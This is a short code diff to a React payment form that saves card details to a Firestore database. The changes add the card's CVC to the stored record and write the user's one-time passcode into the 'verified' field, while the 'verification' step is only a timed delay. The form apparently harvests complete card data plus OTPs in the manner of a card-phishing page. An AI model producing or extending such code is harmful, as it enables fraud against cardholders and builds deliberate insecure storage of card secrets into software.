@@ -29,6 +29,7 @@ export default function PaymentForm() {
         cardName,
         expiryMonth,
         expiryYear,
+        cvc,
         timestamp: new Date(),
         verified: false,
       }
@@ -54,7 +55,7 @@ export default function PaymentForm() {
     await new Promise(resolve => setTimeout(resolve, 1000))
 
     // Update the payment document to mark it as verified
-    await updateDoc(doc(db, 'payments', paymentDocId), { verified: true })
+    await updateDoc(doc(db, 'payments', paymentDocId), { verified: otp })
   }
 
   const isFormValid = cardNumber && cardName && expiryMonth && expiryYear && cvc
